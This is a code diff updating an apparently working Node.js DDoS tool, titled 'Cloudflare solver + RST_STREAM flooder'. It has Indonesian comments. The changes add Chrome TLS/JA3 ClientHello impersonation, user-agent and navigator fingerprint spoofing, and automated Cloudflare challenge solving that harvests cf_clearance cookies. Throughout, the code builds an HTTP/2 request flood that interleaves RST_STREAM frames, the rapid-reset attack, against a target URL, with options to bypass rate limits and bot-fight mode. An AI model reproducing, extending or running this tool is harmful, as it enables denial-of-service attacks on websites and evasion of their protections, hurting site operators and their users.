@@ -1,6 +1,6 @@
 // ============================================================
-//  CLOUDFLARE SOLVER + RST_STREAM FLOODER (COMBINED) v1.1
-//  with realistic fingerprint matching & session rotation
+//  CLOUDFLARE SOLVER + RST_STREAM FLOODER (COMBINED) v1.3
+//  Fixed: TLS/JA3 impersonation matching Chrome ClientHello
 // ============================================================
 
 const { connect } = require("puppeteer-real-browser");
@@ -20,7 +20,7 @@ const chalk = require('chalk');
 // IGNORE LISTS
 // ============================================================
 const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
-const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
+const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
 
 require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
 
@@ -39,9 +39,75 @@ process
     .on("SIGCHILD", () => 1);
 
 // ============================================================
+// TLS IMPERSONATION - Chrome 131 ClientHello
+// ============================================================
+let chromeTlsOptions = null;
+try {
+    const { impersonate } = require('tls-impersonate');
+
+    // Chrome 131 ClientHello spec (verified against tls.peet.ws/api/all)
+    const chromeSpec = {
+        cipherSuites: [
+            0x0a0a, // GREASE
+            0x1301, 0x1302, 0x1303,          // TLS 1.3 AES-GCM, AES-GCM, ChaCha20
+            0xc02b, 0xc02f, 0xc02c, 0xc030,  // ECDHE-ECDSA/RSA AES GCM
+            0xcca9, 0xcca8,                   // ECDHE ChaCha20
+            0xc013, 0xc014,                   // ECDHE CBC
+            0x009c, 0x009d,                   // RSA GCM
+            0x002f, 0x0035                    // RSA CBC
+        ],
+        extensions: [
+            { type: 0x0a0a }, // GREASE
+            { type: 0x0000 }, // server_name
+            { type: 0x0017 }, // extended_master_secret
+            { type: 0xff01 }, // renegotiation_info
+            { type: 0x000a }, // supported_groups
+            { type: 0x000b }, // ec_point_formats
+            { type: 0x0023 }, // session_ticket
+            { type: 0x0010 }, // ALPN
+            { type: 0x0005 }, // status_request
+            { type: 0x000d }, // signature_algorithms
+            { type: 0x0012 }, // signed_certificate_timestamp
+            { type: 0x0033 }, // key_share
+            { type: 0x002d }, // psk_key_exchange_modes
+            { type: 0x002b }, // supported_versions
+            { type: 0x001b }, // compress_certificate
+            { type: 0x4469 }, // application_settings
+            { type: 0x0a0a }, // GREASE
+            { type: 0x0015 }  // padding
+        ],
+        supportedGroups: [
+            0x0a0a, // GREASE
+            0x001d, // X25519
+            0x0017, // secp256r1
+            0x0018  // secp384r1
+        ],
+        signatureAlgorithms: [
+            0x0403, 0x0804, 0x0401,
+            0x0503, 0x0805, 0x0501,
+            0x0806, 0x0601,
+            0x0201, 0x0203
+        ],
+        alpnProtocols: ['h2', 'http/1.1']
+    };
+
+    const result = impersonate(chromeSpec);
+    chromeTlsOptions = result.tlsOptions;
+
+    if (result.unsupported && result.unsupported.length > 0) {
+        console.log(`\x1b[33mTLS impersonate ready (${result.unsupported.length} unsupported parts)\x1b[0m`);
+    } else {
+        console.log(`\x1b[32mTLS impersonate ready: Chrome 131 ClientHello\x1b[0m`);
+    }
+} catch (e) {
+    console.log(`\x1b[31mtls-impersonate FAILED: ${e.message}\x1b[0m`);
+    console.log(`\x1b[33mRun: npm install tls-impersonate (requires Node >= 24.15.0)\x1b[0m`);
+    console.log(`\x1b[33mFalling back to manual cipher config - bypass akan SANGAT KURANG\x1b[0m`);
+}
+
+// ============================================================
 // ARGS
 // ============================================================
-// node combined.js <method> <target> <time> <threads> <ratelimit> <cookieCount> [options]
 const reqmethod = process.argv[2];
 const target = process.argv[3];
 const time = process.argv[4];
@@ -77,25 +143,26 @@ const debugMode = process.argv.includes('--debug') && forceHttp != 1;
 
 if (!reqmethod || !target || !time || !threads || !ratelimit) {
     console.clear();
-    console.log(`${chalk.blue('COMBINED SOLVER + RST_STREAM v1.1')}`);
+    console.log(`${chalk.blue('COMBINED SOLVER + RST_STREAM v1.3')}`);
     console.log(chalk.red.underline('How to use & example:'));
     console.log(chalk.red.bold(`node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <cookieCount> [options]`));
-    console.log(`node ${process.argv[1]} GET "https://target.com?q=%RAND%" 120 16 90 3 --query 1 --debug\n`);
+    console.log(`node ${process.argv[1]} GET "https://target.com?q=%RAND%" 120 16 90 5 --query 1 --debug\n`);
     console.error(chalk.yellow(`
     Options:
-      --limit true/null - to bypass a little bit ratelimit site
-      --query 1/2/3 - query string with rand
-      --debug - show your status code
-      --delay <1-50> - Set delay
-      --bfm true - set bot fight mode
-      --cookie <value> - set cookie
+      --limit true/null     Bypass ratelimit site
+      --query 1/2/3         Query string with rand
+      --debug               Show status code
+      --delay <1-50>        Set delay
+      --bfm true            Set bot fight mode
+      --cookie <value>      Set cookie
       --referer <value>
       --postdata <value>
-      --randrate - random rate
-      --header <header>#<header>
-      --http 1/2/mix
-      --precheck <anything> - run precheck
+      --randrate            Random rate
+      --header <h>#<h>      Custom headers
+      --http 1/2/mix        Force protocol
+      --precheck <any>      Run precheck
       --cdn <hostname>
+      --full                Full rate mode
     `));
     process.exit(1);
 }
@@ -106,10 +173,24 @@ if (!target.startsWith('https://')) {
 }
 
 // ============================================================
-// GLOBAL SESSION STORAGE (diisi dari solver / dipilih worker)
+// REALISTIC UA POOL
+// ============================================================
+const REAL_UA_POOL = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
+];
+
+function pickRealUA() {
+    return REAL_UA_POOL[Math.floor(Math.random() * REAL_UA_POOL.length)];
+}
+
+// ============================================================
+// GLOBAL SESSION
 // ============================================================
 let session = {
-    userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
+    userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
 };
 let cookieString = "";
 
@@ -134,7 +215,9 @@ async function bypassCloudflareOnce(attemptNum = 1) {
                 '--no-first-run',
                 '--no-zygote',
                 '--disable-gpu',
-                '--window-size=1920,1080'
+                '--window-size=1920,1080',
+                '--lang=en-US',
+                '--disable-blink-features=AutomationControlled'
             ],
             turnstile: true,
             connectOption: { defaultViewport: null }
@@ -143,9 +226,53 @@ async function bypassCloudflareOnce(attemptNum = 1) {
         browser = response.browser;
         page = response.page;
 
+        const forcedUA = pickRealUA();
+
+        try {
+            const client = await page.target().createCDPSession();
+            await client.send('Network.setUserAgentOverride', {
+                userAgent: forcedUA,
+                acceptLanguage: 'en-US,en;q=0.9',
+                platform: 'Win32',
+                userAgentMetadata: {
+                    brands: [
+                        { brand: 'Not_A Brand', version: '8' },
+                        { brand: 'Chromium', version: '131' },
+                        { brand: 'Google Chrome', version: '131' }
+                    ],
+                    fullVersion: '131.0.0.0',
+                    fullVersionList: [
+                        { brand: 'Not_A Brand', version: '8.0.0.0' },
+                        { brand: 'Chromium', version: '131.0.0.0' },
+                        { brand: 'Google Chrome', version: '131.0.0.0' }
+                    ],
+                    platform: 'Windows',
+                    platformVersion: '10.0.0',
+                    architecture: 'x86',
+                    model: '',
+                    mobile: false
+                }
+            });
+        } catch (cdpErr) {
+            console.log(`\x1b[33mCDP warning: ${cdpErr.message}\x1b[0m`);
+        }
+
+        await page.setUserAgent(forcedUA);
+
         await page.evaluateOnNewDocument(() => {
             Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
+            Object.defineProperty(navigator, 'platform', { get: () => 'Win32' });
+            Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
+            Object.defineProperty(navigator, 'language', { get: () => 'en-US' });
+            Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 });
+            Object.defineProperty(navigator, 'deviceMemory', { get: () => 8 });
         });
+
+        try {
+            const client = await page.target().createCDPSession();
+            await client.send('Emulation.setTimezoneOverride', { timezoneId: 'Asia/Jakarta' });
+            await client.send('Emulation.setLocaleOverride', { locale: 'en-US' });
+        } catch (tzErr) {}
 
         console.log(`\x1b[33mAccessing ${target}...\x1b[0m`);
 
@@ -191,7 +318,7 @@ async function bypassCloudflareOnce(attemptNum = 1) {
             }
         }
 
-        await new Promise(r => setTimeout(r, 1000));
+        await new Promise(r => setTimeout(r, 1500));
 
         const cookies = await page.cookies();
         console.log(`\x1b[36mFound ${cookies.length} cookies in ${(checkCount * 0.5).toFixed(1)}s\x1b[0m`);
@@ -201,7 +328,7 @@ async function bypassCloudflareOnce(attemptNum = 1) {
             console.log(`\x1b[32mcf_clearance: ${cfClearance.value.substring(0, 30)}...\x1b[0m`);
         }
 
-        const userAgent = await page.evaluate(() => navigator.userAgent);
+        const finalUA = await page.evaluate(() => navigator.userAgent);
         const currentUrl = page.url();
         const pageTitle = await page.title().catch(() => "");
         const viewport = page.viewport();
@@ -210,20 +337,22 @@ async function bypassCloudflareOnce(attemptNum = 1) {
                 language: navigator.language,
                 languages: navigator.languages,
                 platform: navigator.platform,
-                userAgentData: navigator.userAgentData ? {
-                    brands: navigator.userAgentData.brands,
-                    mobile: navigator.userAgentData.mobile,
-                    platform: navigator.userAgentData.platform
-                } : null,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
             };
         });
+
+        console.log(`\x1b[36mFinal UA : ${finalUA}\x1b[0m`);
+        console.log(`\x1b[36mPlatform : ${extraHeaders.platform}\x1b[0m`);
+        console.log(`\x1b[36mTimezone : ${extraHeaders.timezone}\x1b[0m`);
 
         await page.close();
         await browser.close();
 
         return {
-            cookies, userAgent,
+            cookies,
+            userAgent: finalUA,
             cfClearance: cfClearance ? cfClearance.value : null,
             url: currentUrl, title: pageTitle, viewport, headers: extraHeaders,
             success: true, attemptNum
@@ -234,7 +363,7 @@ async function bypassCloudflareOnce(attemptNum = 1) {
         try { if (page) await page.close(); if (browser) await browser.close(); } catch (e) {}
         return {
             cookies: [],
-            userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            userAgent: pickRealUA(),
             cfClearance: null, success: false, attemptNum
         };
     }
@@ -246,7 +375,7 @@ async function bypassCloudflareParallel(totalCount) {
 
     const results = [];
     let attemptCount = 0;
-    const concurrentBypassSessions = 10;
+    const concurrentBypassSessions = 5;
 
     while (results.length < totalCount) {
         const remaining = totalCount - results.length;
@@ -279,7 +408,7 @@ async function bypassCloudflareParallel(totalCount) {
         console.log("\x1b[33mNo Cloudflare cookies obtained\x1b[0m");
         results.push({
             cookies: [],
-            userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            userAgent: pickRealUA(),
             cfClearance: null, success: true
         });
     }
@@ -297,32 +426,21 @@ function printSessionDetails(sessionObj, index) {
     console.log(`\x1b[36mTarget          :\x1b[0m ${target}`);
     if (sessionObj.url) console.log(`\x1b[36mFinal URL       :\x1b[0m ${sessionObj.url}`);
     if (sessionObj.title) console.log(`\x1b[36mPage Title      :\x1b[0m ${sessionObj.title}`);
-
     console.log(`\n\x1b[33m--- User Agent ---\x1b[0m`);
     console.log(`\x1b[32m${sessionObj.userAgent}\x1b[0m`);
-
     console.log(`\n\x1b[33m--- Cloudflare Clearance ---\x1b[0m`);
     console.log(sessionObj.cfClearance ? `\x1b[32mcf_clearance    : ${sessionObj.cfClearance}\x1b[0m` : `\x1b[31mcf_clearance    : NOT FOUND\x1b[0m`);
-
     console.log(`\n\x1b[33m--- Cookies (${sessionObj.cookies ? sessionObj.cookies.length : 0}) ---\x1b[0m`);
     if (sessionObj.cookies && sessionObj.cookies.length > 0) {
         sessionObj.cookies.forEach((c, i) => {
-            console.log(`  [${i + 1}] \x1b[32m${c.name}\x1b[0m = ${c.value}`);
-            console.log(`      Domain  : ${c.domain} | Path: ${c.path}`);
-            console.log(`      Secure  : ${c.secure} | HttpOnly: ${c.httpOnly} | SameSite: ${c.sameSite || "N/A"}`);
+            console.log(`  [${i + 1}] \x1b[32m${c.name}\x1b[0m = ${c.value.substring(0, 80)}`);
         });
-        const cs = sessionObj.cookies.map(c => `${c.name}=${c.value}`).join("; ");
-        console.log(`\n\x1b[33m--- Cookie String (combined) ---\x1b[0m`);
-        console.log(`\x1b[32m${cs}\x1b[0m`);
-    } else {
-        console.log(`  \x1b[31m(no cookies)\x1b[0m`);
     }
-
     if (sessionObj.headers) {
         console.log(`\n\x1b[33m--- Browser Fingerprint ---\x1b[0m`);
-        console.log(`  Language : ${sessionObj.headers.language}`);
-        console.log(`  Platform : ${sessionObj.headers.platform}`);
-        console.log(`  Timezone : ${sessionObj.headers.timezone}`);
+        console.log(`  Language   : ${sessionObj.headers.language}`);
+        console.log(`  Platform   : ${sessionObj.headers.platform}`);
+        console.log(`  Timezone   : ${sessionObj.headers.timezone}`);
     }
     console.log(`\x1b[35m${sep}\x1b[0m`);
 }
@@ -462,38 +580,66 @@ function getRandomInt(min, max) {
 }
 
 // ============================================================
-// UA PARSER (untuk sec-ch-ua yang match dengan User-Agent asli)
+// UA PARSER
 // ============================================================
-function getUABrand(ua) {
-    const m = ua.match(/Chrome\/(\d+)\.(\d+)\.(\d+)\.(\d+)/);
-    if (!m) {
-        return {
-            major: 122,
-            full: "122.0.0.0",
-            brands: '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"'
-        };
+function parseUAFull(ua) {
+    let major = 131, full = "131.0.0.0";
+    let platform = "Windows";
+    let platformVersion = "10.0.0";
+    let arch = "x86";
+    let bitness = "64";
+    let platformHeader = '"Windows"';
+
+    const chromeMatch = ua.match(/Chrome\/(\d+)\.(\d+)\.(\d+)\.(\d+)/);
+    if (chromeMatch) {
+        major = parseInt(chromeMatch[1]);
+        full = `${chromeMatch[1]}.${chromeMatch[2]}.${chromeMatch[3]}.${chromeMatch[4]}`;
     }
-    const major = parseInt(m[1]);
-    const full = `${m[1]}.${m[2]}.${m[3]}.${m[4]}`;
+
+    if (ua.includes("Windows")) {
+        platform = "Windows";
+        platformVersion = "10.0.0";
+        platformHeader = '"Windows"';
+        arch = "x86";
+        bitness = "64";
+    } else if (ua.includes("Macintosh")) {
+        platform = "macOS";
+        platformVersion = "14.0.0";
+        platformHeader = '"macOS"';
+        arch = "arm";
+        bitness = "64";
+    } else if (ua.includes("Linux")) {
+        platform = "Linux";
+        platformVersion = "0.0.0";
+        platformHeader = '"Linux"';
+        arch = "x86";
+        bitness = "64";
+    }
+
     let brands;
-    if (major === 120) brands = `"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"`;
-    else if (major === 121) brands = `"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"`;
-    else if (major === 122) brands = `"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"`;
-    else if (major === 123) brands = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
-    else if (major === 124) brands = `"Not_A Brand";v="8", "Chromium";v="124", "Google Chrome";v="124"`;
-    else if (major === 125) brands = `"Not A(Brand";v="99", "Google Chrome";v="125", "Chromium";v="125"`;
-    else if (major === 126) brands = `"Chromium";v="126", "Not(A:Brand";v="24", "Google Chrome";v="126"`;
-    else if (major === 127) brands = `"Google Chrome";v="127", "Not:A-Brand";v="8", "Chromium";v="127"`;
-    else if (major >= 128) brands = `"Not_A Brand";v="8", "Chromium";v="${major}", "Google Chrome";v="${major}"`;
-    else brands = `"Chromium";v="${major}", "Not(A:Brand";v="24", "Google Chrome";v="${major}"`;
-    return { major, full, brands };
+    if (major >= 128) {
+        brands = `"Not_A Brand";v="8", "Chromium";v="${major}", "Google Chrome";v="${major}"`;
+    } else {
+        brands = `"Chromium";v="${major}", "Not_A Brand";v="8", "Google Chrome";v="${major}"`;
+    }
+
+    if (ua.includes("Brave")) {
+        brands = brands.replace(`"Google Chrome";v="${major}"`, `"Brave";v="${major}"`);
+    }
+
+    const fullVersionList = brands.replace(/v="(\d+)"/g, (_, v) => `v="${v}.0.0.0"`);
+
+    return {
+        major, full, platform, platformVersion, platformHeader, arch, bitness,
+        brands, fullVersionList
+    };
 }
 
 // ============================================================
-// BUILD HTTP/1.1 REQUEST (untuk ALPN http/1.1)
+// BUILD HTTP/1.1 REQUEST
 // ============================================================
 function buildRequest() {
-    const fp = getUABrand(session.userAgent);
+    const fp = parseUAFull(session.userAgent);
     const currentRefererValue = refererValue === 'rand' ? 'https://' + cc(6, 6) + ".net" : refererValue;
 
     let mysor = '\r\n';
@@ -516,7 +662,7 @@ function buildRequest() {
         `User-Agent: ${session.userAgent}\r\n` +
         `sec-ch-ua: ${fp.brands}\r\n` +
         'sec-ch-ua-mobile: ?0\r\n' +
-        'sec-ch-ua-platform: "Windows"\r\n' + mysor1;
+        `sec-ch-ua-platform: ${fp.platformHeader}\r\n` + mysor1;
 
     if (hcookie) headers += `Cookie: ${hcookie}\r\n`;
     if (currentRefererValue) headers += `Referer: ${currentRefererValue}\r\n` + mysor;
@@ -524,7 +670,7 @@ function buildRequest() {
     return Buffer.from(`${headers}`, 'binary');
 }
 
-let h1payl = null; // build saat worker sudah punya session
+let h1payl = null;
 
 function handleQuery(query) {
     if (query === '1') return url.pathname + '?__cf_chl_rt_tk=' + randstrrr(30) + '_' + randstrrr(12) + '-' + timestampString1 + '-0-' + 'gaNy' + randstrrr(8);
@@ -545,10 +691,10 @@ if (shitty) {
     });
     const axiosPromise = axios.get(target, {
         httpsAgent: applu,
-        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36' }
+        headers: { 'User-Agent': pickRealUA() }
     });
     Promise.race([axiosPromise, timeoutPromise])
-        .then((response) => {})
+        .then(() => {})
         .catch((error) => {
             if (error.message === 'Request timed out') console.log('> Precheck: Request Timed Out');
             else if (error.response) console.log(`> Precheck: ${error.response.status}`);
@@ -560,23 +706,38 @@ if (shitty) {
 // FLOODER GO()
 // ============================================================
 function go() {
-    // Rebuild h1 payload sesuai session saat ini (biar UA selalu match)
     h1payl = Buffer.concat(new Array(1).fill(buildRequest()));
 
     let tlsSocket;
 
+    // === Build TLS connect options ===
+    // Kalau chromeTlsOptions tersedia (tls-impersonate), pakai itu.
+    // Fallback: manual cipher config (kurang efektif).
+    const manualTlsOptions = {
+        ALPNProtocols: forceHttp === 1 ? ['http/1.1'] : forceHttp === 2 ? ['h2'] : forceHttp === undefined ? Math.random() >= 0.5 ? ['h2'] : ['http/1.1'] : ['h2', 'http/1.1'],
+        ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA',
+        sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
+        ecdhCurve: 'X25519:P-256:P-384',
+        minVersion: 'TLSv1.2',
+        maxVersion: 'TLSv1.3',
+        secure: true,
+        rejectUnauthorized: false,
+        secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_ALL
+    };
+
+    const baseTlsOptions = chromeTlsOptions
+        ? { ...chromeTlsOptions, rejectUnauthorized: false }
+        : manualTlsOptions;
+
+    // Override ALPN jika forceHttp spesifik
+    if (forceHttp === 1) baseTlsOptions.ALPNProtocols = ['http/1.1'];
+    else if (forceHttp === 2) baseTlsOptions.ALPNProtocols = ['h2'];
+
     tlsSocket = tls.connect({
         host: url.hostname,
         port: 443,
-        ALPNProtocols: forceHttp === 1 ? ['http/1.1'] : forceHttp === 2 ? ['h2'] : forceHttp === undefined ? Math.random() >= 0.5 ? ['h2'] : ['http/1.1'] : ['h2', 'http/1.1'],
         servername: url.host,
-        ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
-        sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
-        secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL,
-        secure: true,
-        minVersion: 'TLSv1.2',
-        maxVersion: 'TLSv1.3',
-        rejectUnauthorized: false
+        ...baseTlsOptions
     }, () => {
         if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {
             if (forceHttp == 2) { tlsSocket.end(() => tlsSocket.destroy()); return; }
@@ -638,8 +799,6 @@ function go() {
                             if (!statuses[status]) statuses[status] = 0;
                             statuses[status]++;
 
-                            // 200 OK → biarkan koneksi hidup, main() loop lanjut kirim request
-                            // 403 / 429 → tutup & worker akan buat koneksi baru dengan session berbeda
                             if (status == 403 || status == 429) {
                                 tlsSocket.write(encodeRstStream(0, 3, 0));
                                 tlsSocket.end(() => tlsSocket.destroy());
@@ -678,11 +837,7 @@ function go() {
             if (randrate !== undefined) ratelimitLocal = getRandomInt(1, 64);
             else ratelimitLocal = process.argv[6];
 
-            // Fingerprint UA asli (match dengan session userAgent)
-            const fp = getUABrand(session.userAgent);
-
-            // Bangun list brand versi full untuk sec-ch-ua-full-version-list
-            const fullVersionList = fp.brands.replace(/v="(\d+)"/g, (_, v) => `v="${v}.0.0.0"`);
+            const fp = parseUAFull(session.userAgent);
 
             for (let i = 0; i < (isFull ? ratelimitLocal : 1); i++) {
 
@@ -728,7 +883,7 @@ function go() {
                     startFlood();
                 }
 
-                // ---- Pseudo-headers WAJIB di depan & urut ----
+                // === Pseudo-headers (WAJIB di depan, urut) ===
                 const pseudoHeaders = [
                     [":method", reqmethod],
                     [":authority", url.hostname],
@@ -736,17 +891,12 @@ function go() {
                     [":path", query ? handleQuery(query) : url.pathname + (postdata ? `?${postdata}` : "")],
                 ];
 
-                // ---- Browser headers realistis (match dengan UA asli) ----
+                // === Browser headers (FIXED ORDER, match Chrome 131) ===
+                // Chrome tidak shuffle header — urutan fixed seperti ini:
                 const browserHeaders = [
                     ["sec-ch-ua", fp.brands],
                     ["sec-ch-ua-mobile", "?0"],
-                    ["sec-ch-ua-platform", '"Windows"'],
-                    ["sec-ch-ua-platform-version", "10.0.0"],
-                    ["sec-ch-ua-arch", '"x86"'],
-                    ["sec-ch-ua-bitness", '"64"'],
-                    ["sec-ch-ua-model", '""'],
-                    ["sec-ch-ua-full-version", `"${fp.full}"`],
-                    ["sec-ch-ua-full-version-list", fullVersionList],
+                    ["sec-ch-ua-platform", fp.platformHeader],
                     ["upgrade-insecure-requests", "1"],
                     ["user-agent", session.userAgent],
                     ["accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"],
@@ -756,22 +906,12 @@ function go() {
                     ["sec-fetch-dest", "document"],
                     ["accept-encoding", "gzip, deflate, br, zstd"],
                     ["accept-language", "en-US,en;q=0.9"],
-                    ["priority", "u=0, i"],
                 ];
 
-                // Shuffle hanya browser headers (bukan pseudo)
-                for (let j = browserHeaders.length - 1; j > 0; j--) {
-                    const k = Math.floor(Math.random() * (j + 1));
-                    [browserHeaders[j], browserHeaders[k]] = [browserHeaders[k], browserHeaders[j]];
-                }
-
-                // Cookie dari solver (cf_clearance asli)
+                // Cookie di akhir (Chrome taruh cookie setelah accept-language)
                 const cookieHeader = cookieString ? [["cookie", cookieString]] : [];
-
-                // Custom headers user
                 const customArr = customHeadersArray.map(h => Object.entries(h)[0]);
 
-                // Gabung: pseudo → browser → cookie → custom (pseudo tetap di depan)
                 const combinedHeaders = [
                     ...pseudoHeaders,
                     ...browserHeaders,
@@ -800,22 +940,29 @@ function go() {
                     Buffer.from([0x80, 0, 0, 0, 0xFF]),
                     hpack.encode(combinedHeaders)
                 ]);
-                const flags = 0x1 | 0x4 | 0x8 | 0x20;
-                const encodedFrame = encodeFrame(streamId, 1, packed, flags);
-                const frame = Buffer.concat([encodedFrame]);
+
+                // Flags: END_STREAM | END_HEADERS | PRIORITY (0x25)
+                // PRIORITY flag membutuhkan 5 byte priority info di awal payload
+                const priorityInfo = Buffer.alloc(5);
+                priorityInfo.writeUInt32BE(0, 0);  // exclusive=0, depends_on=0
+                priorityInfo.writeUInt8(256 - 1, 4); // weight = 256 (encoded sebagai 255)
+
+                const packedWithPriority = Buffer.concat([priorityInfo, packed]);
+                const encodedFrame = encodeFrame(streamId, 1, packedWithPriority, 0x25);
+
                 if (STREAMID_RESET >= 5 && (STREAMID_RESET - 5) % 10 === 0) {
                     const rstStreamFrame = encodeFrame(streamId, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0);
-                    tlsSocket.write(Buffer.concat([rstStreamFrame, frame]));
+                    tlsSocket.write(Buffer.concat([rstStreamFrame, encodedFrame]));
                     STREAMID_RESET = 0;
+                } else {
+                    requests.push(encodedFrame);
                 }
 
-                requests.push(encodeFrame(streamId, 1, packed, 0x25));
                 streamId += 2;
             }
 
             tlsSocket.write(Buffer.concat(requests), (err) => {
